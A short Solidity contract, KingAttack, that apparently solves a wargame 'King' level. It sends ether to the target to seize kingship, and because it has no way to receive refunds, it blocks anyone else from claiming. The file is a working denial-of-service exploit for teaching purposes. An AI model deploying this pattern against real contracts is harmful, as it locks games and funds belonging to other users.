// SPDX-License-Identifier: MIT
pragma solidity >=0.7.5 <0.8.0;

interface IKing {
    receive() external payable;
    function _king() external view returns (address payable);
}

contract KingAttack {
    IKing public kingContract;

    constructor(address payable _instance) public {
        kingContract = IKing(_instance);
    }

    function becomeKing() external payable {
        (bool success,) = address(kingContract).call{value: msg.value}("");
        require(success, "Transfer failed.");
    }
}

